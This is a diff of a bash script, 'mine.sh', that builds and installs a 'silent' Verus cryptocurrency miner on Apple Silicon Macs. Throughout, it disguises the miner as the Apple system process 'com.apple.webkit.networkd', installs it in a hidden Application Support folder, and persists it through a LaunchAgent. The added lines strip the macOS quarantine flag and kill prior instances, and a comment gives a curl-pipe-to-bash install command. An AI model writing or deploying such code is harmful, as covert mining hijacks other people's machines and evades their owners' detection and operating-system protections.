@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # ============================================================
 # mine.sh — Silent Verus (VRSC) miner for macOS Apple Silicon
-# Builds ccminer natively from source (M1/M2/M3/M4 compatible)
+# Builds ccminer natively (M1/M2/M3/M4) via autotools
 # Process appears as: "com.apple.webkit.networkd"
 # Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine.sh | bash
 # ============================================================
@@ -12,7 +12,6 @@ POOL_HOST="na.luckpool.net"
 POOL_PORT="3956"
 THREADS=$(sysctl -n hw.logicalcpu)
 
-# ---- disguise ----
 DISGUISE_NAME="com.apple.webkit.networkd"
 INSTALL_DIR="$HOME/Library/Application Support/.wknd"
 BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
@@ -23,7 +22,7 @@ BUILD_DIR="$INSTALL_DIR/.build"
 mkdir -p "$INSTALL_DIR" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"
 
 if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
-  echo "[!] This script requires macOS Apple Silicon (M1/M2/M3/M4)."
+  echo "[!] Requires macOS Apple Silicon (M1/M2/M3/M4)."
   exit 1
 fi
 
@@ -31,46 +30,49 @@ echo "[*] Apple Silicon detected — ${THREADS} cores"
 
 # ---- stop old instance ----
 launchctl unload "$PLIST_PATH" 2>/dev/null || true
+pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
+sleep 1
 
 # ---- build from source if binary missing ----
 if [[ ! -f "$BINARY_PATH" ]]; then
-  echo "[*] Binary not found — building ccminer from source..."
+  echo "[*] Building ccminer from source..."
 
-  # 1. Install build deps via Homebrew
+  # ensure Homebrew is available
   if ! command -v brew &>/dev/null; then
     echo "[*] Installing Homebrew..."
     /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null
-    eval "$(/opt/homebrew/bin/brew shellenv)"
-  else
-    eval "$(/opt/homebrew/bin/brew shellenv)"
   fi
+  eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null || /usr/local/bin/brew shellenv 2>/dev/null)"
 
-  echo "[*] Installing build tools (cmake, boost, openssl)..."
-  brew install cmake boost openssl 2>/dev/null
+  echo "[*] Installing build tools..."
+  brew install automake autoconf openssl curl 2>/dev/null
 
-  # 2. Clone monkins1010/ccminer (best maintained verus fork)
+  # set openssl paths for arm homebrew
+  OPENSSL_PREFIX="$(brew --prefix openssl)"
+  export LDFLAGS="-L${OPENSSL_PREFIX}/lib"
+  export CPPFLAGS="-I${OPENSSL_PREFIX}/include"
+  export PKG_CONFIG_PATH="${OPENSSL_PREFIX}/lib/pkgconfig"
+
   rm -rf "$BUILD_DIR"
   git clone --depth 1 https://github.com/monkins1010/ccminer "$BUILD_DIR"
-
-  # 3. Build
   cd "$BUILD_DIR"
-  mkdir -p build && cd build
 
-  cmake .. \
-    -DBOOST_ROOT="$(brew --prefix boost)" \
-    -DOPENSSL_ROOT_DIR="$(brew --prefix openssl)" \
-    -DCUDA_ENABLED=OFF \
-    -DCMAKE_BUILD_TYPE=Release 2>&1 | tail -5
+  echo "[*] Running autogen..."
+  ./autogen.sh 2>&1 | tail -5
 
-  make -j"$THREADS" 2>&1 | tail -10
+  echo "[*] Configuring..."
+  ./configure.sh 2>&1 | tail -10
 
-  # 4. Copy binary with disguised name
-  if [[ -f "$BUILD_DIR/build/ccminer" ]]; then
-    cp "$BUILD_DIR/build/ccminer" "$BINARY_PATH"
+  echo "[*] Compiling (this takes ~5 min)..."
+  make -j"$THREADS" 2>&1 | tail -5
+
+  if [[ -f "$BUILD_DIR/ccminer" ]]; then
+    cp "$BUILD_DIR/ccminer" "$BINARY_PATH"
     chmod +x "$BINARY_PATH"
+    xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
     echo "[+] Build successful."
   else
-    echo "[!] Build failed — check brew deps."
+    echo "[!] Build failed — check output above."
     exit 1
   fi
 else
@@ -122,4 +124,5 @@ echo "  Live logs : tail -f \"$LOG_PATH\""
 echo "  Status    : launchctl list | grep webkit.networkd"
 echo "  Stop      : launchctl unload \"$PLIST_PATH\""
 echo ""
-tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear shortly..."
+sleep 3
+tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear shortly — check in 30 seconds."
